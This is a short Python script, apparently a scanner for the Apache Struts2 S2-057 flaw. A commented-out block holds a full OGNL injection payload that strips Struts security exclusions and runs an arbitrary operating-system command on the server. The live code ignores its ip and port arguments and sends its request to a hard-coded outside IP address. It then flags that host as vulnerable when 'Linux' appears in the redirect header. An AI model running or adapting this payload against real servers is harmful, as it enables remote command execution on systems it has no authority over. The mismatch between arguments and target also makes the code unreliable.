import requests


def verify(ip, port, cmd="uname"):
    '''
    response = requests.get(
        "http://" + ip + ":" + str(port)
        + "/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec("
        + cmd + ")).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}/$%7B233*233%7D/actionChain1.action"
        )'''
    response = requests.get("http://107.174.27.242:8076/struts2-showcase/54289/register2.action", allow_redirects=False)
    headers = response.headers
    print(headers)
    if "Linux" in response.headers['location']:
        return {
            "name": "Struts2 S2-057",
            "target": f"{ip}:{port}"
        }
    else:
        return None

